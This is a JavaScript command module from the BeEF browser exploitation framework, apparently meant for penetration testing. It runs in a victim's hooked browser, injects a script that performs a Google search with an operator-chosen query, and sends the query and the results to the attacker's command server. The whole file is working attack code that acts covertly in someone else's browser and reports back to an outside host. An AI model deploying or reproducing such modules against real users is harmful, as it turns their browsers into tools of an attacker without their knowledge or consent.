//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var query = '<%= @query.gsub(/'/, "\\'") %>';

	var searchGoogle = function(query) {

		var script = document.createElement('script');
		script.defer = true;
		script.type = "text/javascript";
		script.src = "https://ajax.googleapis.com/ajax/services/search/web?callback=callback&lstkp=0&rsz=large&hl=en&q=" + query + "&v=1.0";

		callback = function (results) {
			document.body.removeChild(script);
			delete callback;
			beef.net.send('<%= @command_url %>', <%= @command_id %>, "query="+query+"&results="+JSON.stringify(results));
		};

		document.body.appendChild(script);
	}

	searchGoogle(query);

});

